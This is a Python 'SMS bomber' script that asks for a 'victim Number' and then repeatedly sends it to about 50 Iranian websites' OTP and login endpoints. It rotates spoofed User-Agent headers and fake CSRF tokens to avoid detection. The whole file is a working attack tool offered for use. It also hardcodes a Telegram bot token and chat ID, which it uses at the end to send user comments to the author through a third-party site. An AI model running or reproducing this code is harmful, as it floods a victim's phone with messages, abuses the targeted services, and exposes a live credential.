import requests
import random
import time
from colorama import init, Fore, Style

time.sleep(2)
code =  ('''


                                    ▄▄▄██▀▀▀▄▄▄       ██░ ██ ▓█████▄  ██▓
                                       ▒██  ▒████▄    ▓██░ ██▒▒██▀ ██▌▓██▒
                                       ░██  ▒██  ▀█▄  ▒██▀▀██░░██   █▌▒██▒
                                    ▓██▄██▓ ░██▄▄▄▄██ ░▓█ ░██ ░▓█▄   ▌░██░
                                     ▓███▒   ▓█   ▓██▒░▓█▒░██▓░▒████▓ ░██░
                                     ▒▓▒▒░   ▒▒   ▓▒█░ ▒ ░░▒░▒ ▒▒▓  ▒ ░▓  
                                     ▒ ░▒░    ▒   ▒▒ ░ ▒ ░▒░ ░ ░ ▒  ▒  ▒ ░
                                     ░ ░ ░    ░   ▒    ░  ░░ ░ ░ ░  ░  ▒ ░
                                     ░   ░        ░  ░ ░  ░  ░   ░     ░  
                                                               ░     
         
                                            Create  By  Jahdi0
                                        Children of Cyrus the Great
> 50 API
> Free
> No vpn required
> Free for Iranians
---------------------------------------------------------------------------------------------------------------
''') 

highlighted_code = Fore.GREEN + code + Style.RESET_ALL
print(highlighted_code)
time.sleep(2)
print("Loding....")

time.sleep(2)

Number1 = input ("Type victim Number : ")

Number = str(Number1)

# ---------------jahdi0------------------
#  ▄▄▄██▀▀▀▄▄▄       ██░ ██ ▓█████▄  ██▓
#    ▒██  ▒████▄    ▓██░ ██▒▒██▀ ██▌▓██▒
#    ░██  ▒██  ▀█▄  ▒██▀▀██░░██   █▌▒██▒
# ▓██▄██▓ ░██▄▄▄▄██ ░▓█ ░██ ░▓█▄   ▌░██░
#  ▓███▒   ▓█   ▓██▒░▓█▒░██▓░▒████▓ ░██░
#  ▒▓▒▒░   ▒▒   ▓▒█░ ▒ ░░▒░▒ ▒▒▓  ▒ ░▓  
#  ▒ ░▒░    ▒   ▒▒ ░ ▒ ░▒░ ░ ░ ▒  ▒  ▒ ░
#  ░ ░ ░    ░   ▒    ░  ░░ ░ ░ ░  ░  ▒ ░
#  ░   ░        ░  ░ ░  ░  ░   ░     ░  
#                            ░          
# ---------------jahdi0------------------
Windows1 = [
    {"0d958e16e9932aeeb4d8d398fc4df68886a487c5"
    },
    {"0d358e16e9432aeeb4d8s398fc4df68886a487c5"
    },
    {"0d158e16e9932aeeb4d8d368fc4df68886a487c5"
    },
    {"0d558e16e9932aeeb4d8d396fc4df68886a487c5"
    },
    {"0d458e16e9935aeeb4d8d398fc4df68886a487c5"
    },
    {"0d558e16e9932aeeb4d8d398fc4df68886a462c5"
    },
    {"0d368e16e9432aeeb4d8s398fc4df68886a417c5"
    },
    {"0d234e16e9932aeeb4d8d368fc4df68886a627c5"
    },
    {"0d456e16e9932aeeb4d8d246fc4df68886a487c5"
    },
    {"0d475e16e9935aeeb4d8d398fc4df68886a487c5"
    }
]

Windows = random.choice(Windows1)


a1 = "https://www.mofidteb.com/auth/ajaxLogin"
a2 = {"username": "0" +Number}
a3 = {"YII_CSRF_TOKEN":Windows}

# ----------Divar----------------------------

b1 = "https://api.divar.ir/v5/auth/authenticate"
b2 = {"phone":Number}


# ------------------Snap--------------------

c1 = "https://api.snapp.ir/api/v1/sms/link"
c2 = {"phone":"0"+Number}


# -----------------------Khanomi------------------------------=

d1 = "https://www.khanoumi.com/accounts/sendotp"
d2 = {"mobile":"0"+Number}


# -----------------------Nothing------------------------------=

e1 = "https://mobapi.banimode.com/api/v2/auth/request"
e2 = {"phone":"0"+Number}


# -------------------nothing------------------------

f1 = "https://auth.honari.com/api/confirm-time"
f2 = {"username":"0"+Number}


# ---------------------nothing-------------------------

g1 = "https://lottery.rayanertebat.ir/api/User/Otp?t=1629962148651"
g2 = {"mobileNo":"0"+Number}


# --------------------nothing----------------------

h1 = "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request"
h2 = {"UserName":"+98"+Number}


# --------------------nothing ----------------------

i1 = "https://ketabchi.com/api/v1/auth/requestVerificationCode"
i2 = {"phoneNumber":"0"+Number}


# # --------------------nothing----------------------

k1 = "https://mobapi.banimode.com/api/v2/auth/request"
k2 = {"phone":"0"+Number}

# ------------------------------------------

j1 = "https://tagmond.com/phone_number"
j2 = {"phone_number":"0"+Number}


# -----------------Nothing-------------------------

l1 = "https://padmira.ir/ajax/send_sms_active"
l2 = {"mobile":"0"+Number}


# -----------------Nothing-------------------------

m1 = "https://www.digistyle.com/users/login-register/"
m2 = {"loginRegister[email_phone]":"0"+Number}
# -----------------Nothing-------------------------

n1 = "https://www.sheypoor.com/api/v10.0.0/auth/send"
n2 = {"username":"0"+Number}
# -----------------Nothing-------------------------

o1 = "https://api.karnameh.com/v1/carinspection/auth/authenticate"
o2 = {"phone": "0"+Number}
# -----------------Nothing-------------------------

p1 = "https://api.digikalajet.ir/user/login-register/"
p2 = {"phone": "0"+Number}
# -----------------Nothing-------------------------

q1 = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
q2 = {"phoneNumber": Number}
# -----------------Nothing-------------------------

r1 = "https://www.hamrah-mechanic.com/api/v1/membership/otp"
r2 = {"PhoneNumber": "0"+Number}
# -----------------Nothing-------------------------

s1 = "https://api.esam.ir/api/account/RegisterOrLogin"
s2 = {"mobile": "0"+Number}
# -----------------Nothing-------------------------

t1 = "https://api.digikalajet.ir/user/login-register/"
t2 = {"phone": "0"+Number}
# -----------------Nothing-------------------------

u1 = "https://www.dolichi.com/login?back=my-account"
u2 = {"username": "0"+Number}
# -----------------Nothing-------------------------

v1 = "https://www.modiage.com/loginregister"
v2 = {"Username": "0"+Number}
# -----------------Nothing-------------------------

w1 = "https://api.lendo.ir/api/customer/auth/check-password"
w2 = {"mobile":"0"+Number}
# -----------------Nothing-------------------------

x1 = "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0"+Number
x2 = {}
# -----------------Nothing-------------------------

y1 = "https://api.alldigitall.ir/v1/auth/init?store_id=0"
y2 = {"username": "0"+Number}
# -----------------Nothing-------------------------

z1 = "https://api.torob.com/v4/user/phone/send-pin/?phone_number=0"+Number
z2 = {}
# -----------------Nothing-------------------------

aa1 = "https://safarmarket.com//api/security/v1/user/is_phone_available?phone=0"+Number
aa2 = {}
# -----------------Nothing-------------------------

bb1 = "https://gw.taaghche.com/v4/site/auth/signup"
bb2 = {"contact": "0"+Number}
# -----------------Nothing-------------------------

cc1 = "https://api.pindo.ir/v1/user/login-register/"
cc2 = {"phone": "0"+Number}
# -----------------Nothing-------------------------

dd1 = "https://api.digikala.com/v1/user/authenticate/"
dd2 = {
	"status": 200,
	"data": {
		"phone": "0"+Number ,
		"has_account": "true",
		"login_method": "otp",
		"sms_ttl": 180,
		"has_password": "false"
	}}

# -----------------Nothing-------------------------

ee1 = "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=e0054637-a7fc-4ee3-b16b-c2160437d57b&locale=fa"
ee2 = {"cellphone": "0"+Number}
# -----------------Nothing-------------------------

ff1 = "https://www.filimo.com/api/fa/v1/user/Authenticate/country_code?afterlogin=buy&package_id=1&pbl=122"
ff2 = {"mobile": "0"+Number}
# -----------------Nothing-------------------------

gg1 = "https://digido.ir/login?back=my-account"
gg2 = {"username": "0"+Number}
# -----------------Nothing-------------------------

hh1 = "https://ketabchi.com/api/v1/auth/requestVerificationCode"
hh2 = {"phoneNumber": "0"+Number}
# -----------------Nothing-------------------------

ii1 = "https://petkharid.com/login?back=https://petkharid.com"
ii2 = {"username": "0"+Number}
# -----------------Nothing-------------------------

jj1 = "https://pinket.com/api/cu/v2/phone-verification"
jj2 = {"phoneNumber": "0"+Number}
# -----------------Nothing-------------------------

kk1 = "https://my.mizbanfa.net/index.php?m=LoginViaSms"
kk2 = {"mobilePhoneNumber": "0"+Number}
# -----------------Nothing-------------------------

ll1 = "https://tagmond.com/phone_number"
ll2 = {"phone_number": "0"+Number}
# -----------------Nothing-------------------------

mm1 = "https://www.inchand.com/otp"
mm2 = {"mobile": "0"+Number}
# -----------------Nothing-------------------------

nn1 = "https://gem-sport.ir/api/v1/sessions/login_request"
nn2 = {"mobile_phone": "0"+Number}
# -----------------Nothing-------------------------

oo1 = "https://mobapi.banimode.com/api/v2/auth/request"
oo2 = {"phone": "0"+Number}
# -----------------Nothing-------------------------

pp1 = "https://bikoplus.com/Auth/CheckUserPhoneNumber"
pp2 = {"userPhoneNumber	": "0"+Number}
# -----------------Nothing-------------------------

qq1 = "https://napi.shahresandal.com/api/sendcode"
qq2 = {"mobile": "0"+Number}
# -----------------Nothing-------------------------

rr1 = "https://api.snapp.ir/api/v1/sms/link"
rr2 = {"phone":"0"+Number}
# -----------------Nothing-------------------------

ss1 = "https://www.hamrah-mechanic.com/api/v1/membership/otp"
ss2 = {"PhoneNumber": "0"+Number}
# -----------------Nothing-------------------------

tt1 = "https://tagmond.com/phone_number"
tt2 = {"phone_number":"0"+Number}

# -----------------Nothing-------------------------

uu1 = "https://padmira.ir/ajax/send_sms_active"
uu2 = {"mobile":"0"+Number}

# -----------------Nothing-------------------------

vv1 = "https://www.filimo.com/api/fa/v1/user/Authenticate/country_code?afterlogin=buy&package_id=1&pbl=122"
vv2 = {"mobile": "0"+Number}
# -----------------Nothing-------------------------

ww1 = "https://api.alldigitall.ir/v1/auth/init?store_id=0"
ww2 = {"username": "0"+Number}
# -----------------Nothing-------------------------

xx1 = "https://api.lendo.ir/api/customer/auth/check-password"
xx2 = {"mobile":"0"+Number}
# -----------------Nothing-------------------------

# ---------------jahdi0------------------
#  ▄▄▄██▀▀▀▄▄▄       ██░ ██ ▓█████▄  ██▓
#    ▒██  ▒████▄    ▓██░ ██▒▒██▀ ██▌▓██▒
#    ░██  ▒██  ▀█▄  ▒██▀▀██░░██   █▌▒██▒
# ▓██▄██▓ ░██▄▄▄▄██ ░▓█ ░██ ░▓█▄   ▌░██░
#  ▓███▒   ▓█   ▓██▒░▓█▒░██▓░▒████▓ ░██░
#  ▒▓▒▒░   ▒▒   ▓▒█░ ▒ ░░▒░▒ ▒▒▓  ▒ ░▓  
#  ▒ ░▒░    ▒   ▒▒ ░ ▒ ░▒░ ░ ░ ▒  ▒  ▒ ░
#  ░ ░ ░    ░   ▒    ░  ░░ ░ ░ ░  ░  ▒ ░
#  ░   ░        ░  ░ ░  ░  ░   ░     ░  
#                            ░          
# ---------------jahdi0------------------
head = [
    {
        'User-Agent': 'Mozilla/4.0 (Windows NT 6.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0',
        'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 8.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/72.0',
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/3.0 (Windows NT 7.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/2.0 (Windows NT 3.1; Win64; x32; rv:104.0) Gecko/20100101 Firefox/104.0',
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x64_64; rv:72.0) Gecko/20100101 Firefox/99.0',
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/3.0 (Windows NT 6.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0',
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 8.0; Win64; x86; rv:104.0) Gecko/20100101 Firefox/72.0',
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x64_64; rv:82.0) Gecko/20100101 Firefox/50.0',
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/2.0 (Windows NT 8.1; Win64; x32; rv:104.0) Gecko/20100101 Firefox/104.0',
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x64_64; rv:72.0) Gecko/20100101 Firefox/99.0',
    'Accept': '*/*'
    }
]

 # ---------------jahdi0------------------
#  ▄▄▄██▀▀▀▄▄▄       ██░ ██ ▓█████▄  ██▓
#    ▒██  ▒████▄    ▓██░ ██▒▒██▀ ██▌▓██▒
#    ░██  ▒██  ▀█▄  ▒██▀▀██░░██   █▌▒██▒
# ▓██▄██▓ ░██▄▄▄▄██ ░▓█ ░██ ░▓█▄   ▌░██░
#  ▓███▒   ▓█   ▓██▒░▓█▒░██▓░▒████▓ ░██░
#  ▒▓▒▒░   ▒▒   ▓▒█░ ▒ ░░▒░▒ ▒▒▓  ▒ ░▓  
#  ▒ ░▒░    ▒   ▒▒ ░ ▒ ░▒░ ░ ░ ▒  ▒  ▒ ░
#  ░ ░ ░    ░   ▒    ░  ░░ ░ ░ ░  ░  ▒ ░
#  ░   ░        ░  ░ ░  ░  ░   ░     ░  
#                            ░          
# ---------------jahdi0------------------

while True:
    random = random.choice(head)
    time.sleep(4)
    print("Target----->"+Number)
    print("Are you sure about this?")
    hh43 = input("Yes(Enter) No(Ctrl+C)")
    print("Attack Starting.... ")
    time.sleep(6)

    req = requests.post(url=a1,json=a2,headers=random)
    time.sleep(1)
    print(req)

    req2 = requests.post(url=b1,json=b2,headers=random)
    time.sleep(1)
    print(req2)
    
    req3 = requests.post(url=c1,json=c2,headers=random)
    time.sleep(1)
    print(req3)
    
    req4 = requests.post(url=d1,json=d2,headers=random)
    time.sleep(1)
    print(req4)
    
    req5 = requests.post(url=e1,json=e2,headers=random)
    time.sleep(1)
    print(req5)
    
    req6 = requests.post(url=f1,json=f2,headers=random)
    time.sleep(1)
    print(req6)
    
    req7 = requests.post(url=g1,json=g2,headers=random)
    time.sleep(1)
    print(req7)
    
    req8 = requests.post(url=h1,json=h2,headers=random)
    time.sleep(1)
    print(req8)
    
    req9 = requests.post(url=i1,json=i2,headers=random)
    time.sleep(1)
    print(req9)
    
    req10 = requests.post(url=k1,json=k2,headers=random)
    time.sleep(1)
    print(req10)
    
    req11 = requests.post(url=j1,json=j2,headers=random)
    time.sleep(1)
    print(req11)
    
    req12 = requests.post(url=l1,json=l2,headers=random)
    time.sleep(1)
    print(req12)
    
    req13 = requests.post(url=m1,json=m2,headers=random)
    time.sleep(1)
    print(req13)
    
    req14 = requests.post(url=n1,json=n2,headers=random)
    time.sleep(1)
    print(req14)
    
    req15 = requests.post(url=o1,json=o2,headers=random)
    time.sleep(1)
    print(req15)
    
    req16 = requests.post(url=p1,json=p2,headers=random)
    time.sleep(1)
    print(req16)
    
    req17 = requests.post(url=q1,json=q2,headers=random)
    time.sleep(1)
    print(req17)
    
    req18 = requests.post(url=r1,json=r2,headers=random)
    time.sleep(1)
    print(req18)
    
    req19 = requests.post(url=s1,json=s2,headers=random)
    time.sleep(1)
    print(req19)
    
    req20 = requests.post(url=t1,json=t2,headers=random)
    time.sleep(1)
    print(req20)
    
    req21 = requests.post(url=u1,json=u2,headers=random)
    time.sleep(1)
    print(req21)
    
    req22 = requests.post(url=v1,json=v2,headers=random)
    time.sleep(1)
    print(req22)
    
    req23 = requests.post(url=w1,json=w2,headers=random)
    time.sleep(1)
    print(req23)
    
    req24 = requests.post(url=x1,json=x2,headers=random)
    time.sleep(1)
    print(req24)
    
    req25 = requests.post(url=y1,json=y2,headers=random)
    time.sleep(1)
    print(req25)
    
    req26 = requests.post(url=z1,json=z2,headers=random)
    time.sleep(1)
    print(req26)
    
    req27 = requests.post(url=aa1,json=aa2,headers=random)
    time.sleep(1)
    print(req27)
    
    req28 = requests.post(url=bb1,json=bb2,headers=random)
    time.sleep(1)
    print(req28)
    
    req29 = requests.post(url=cc1,json=cc2,headers=random)
    time.sleep(1)
    print(req29)
    
    req30 = requests.post(url=dd1,json=dd2,headers=random)
    time.sleep(1)
    print(req30)
    
    req31 = requests.post(url=ee1,json=ee2,headers=random)
    time.sleep(1)
    print(req31)
    
    req32 = requests.post(url=ff1,json=ff2,headers=random)
    time.sleep(1)
    print(req32)
    
    req33 = requests.post(url=gg1,json=gg2,headers=random)
    time.sleep(1)
    print(req33)
    
    req34 = requests.post(url=hh1,json=hh2,headers=random)
    time.sleep(1)
    print(req34)
    
    req35 = requests.post(url=ii1,json=ii2,headers=random)
    time.sleep(1)
    print(req35)
    
    req36 = requests.post(url=jj1,json=jj2,headers=random)
    time.sleep(1)
    print(req36)
    
    req37 = requests.post(url=kk1,json=kk2,headers=random)
    time.sleep(1)
    print(req37)
    
    req38 = requests.post(url=ll1,json=ll2,headers=random)
    time.sleep(1)
    print(req38)
    
    req39 = requests.post(url=mm1,json=mm2,headers=random)
    time.sleep(1)
    print(req39)
    
    req40 = requests.post(url=nn1,json=nn2,headers=random)
    time.sleep(1)
    print(req40)
    
    req41 = requests.post(url=oo1,json=oo2,headers=random)
    time.sleep(1)
    print(req41)
    
    req42 = requests.post(url=pp1,json=pp2,headers=random)
    time.sleep(1)
    print(req42)
    
    req43 = requests.post(url=qq1,json=qq2,headers=random)
    time.sleep(1)
    print(req43)
    
    req44 = requests.post(url=rr1,json=rr2,headers=random)
    time.sleep(1)
    print(req44)
    
    req45 = requests.post(url=ss1,json=ss2,headers=random)
    time.sleep(1)
    print(req45)
    
    req46 = requests.post(url=tt1,json=tt2,headers=random)
    time.sleep(1)
    print(req46)
    
    req47 = requests.post(url=uu1,json=uu2,headers=random)
    time.sleep(1)
    print(req47)
    
    req48 = requests.post(url=vv1,json=vv2,headers=random)
    time.sleep(1)
    print(req48)
    
    req49 = requests.post(url=ww1,json=ww2,headers=random)
    time.sleep(1)
    print(req49)
    
    req50 = requests.post(url=xx1,json=xx2,headers=random)
    time.sleep(1)
    print(req50)




    # -------------End---------------
    print('''


                                    ▄▄▄██▀▀▀▄▄▄       ██░ ██ ▓█████▄  ██▓
                                       ▒██  ▒████▄    ▓██░ ██▒▒██▀ ██▌▓██▒
                                       ░██  ▒██  ▀█▄  ▒██▀▀██░░██   █▌▒██▒
                                    ▓██▄██▓ ░██▄▄▄▄██ ░▓█ ░██ ░▓█▄   ▌░██░
                                     ▓███▒   ▓█   ▓██▒░▓█▒░██▓░▒████▓ ░██░
                                     ▒▓▒▒░   ▒▒   ▓▒█░ ▒ ░░▒░▒ ▒▒▓  ▒ ░▓  
                                     ▒ ░▒░    ▒   ▒▒ ░ ▒ ░▒░ ░ ░ ▒  ▒  ▒ ░
                                     ░ ░ ░    ░   ▒    ░  ░░ ░ ░ ░  ░  ▒ ░
                                     ░   ░        ░  ░ ░  ░  ░   ░     ░  
                                                               ░     
         
                                            Create  By  Jahdi0
                                        Children of Cyrus the Great
> 50 API
> Free
> No vpn required
> Free for Iranians
---------------------------------------------------------------------------------------------------------------
''')
    print("------> Nazaret Ro Benvis <------")
    Nazarat = input ("Type :")  
    token = ("6149717348:AAHLSQUwBOPewqDicfStDIF-iitia4s4QJw")
    id = ("678099805&")
    url = ("https://api.telegram.org/bot6149717348:AAHLSQUwBOPewqDicfStDIF-iitia4s4QJw/sendmessage?chat_id=678099805&text="+"Nazar Az SmSBomber : "+ Nazarat)
    
    drkh = {
    "UrlBox":url,
    "AgentList":"Mozilla Firefox",
    "VersionsList":"HTTP/1.1",
    "MethodList":"POST"
    }

    req = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",drkh)
    print("Nazaret Ersal SHod Mersi :)")

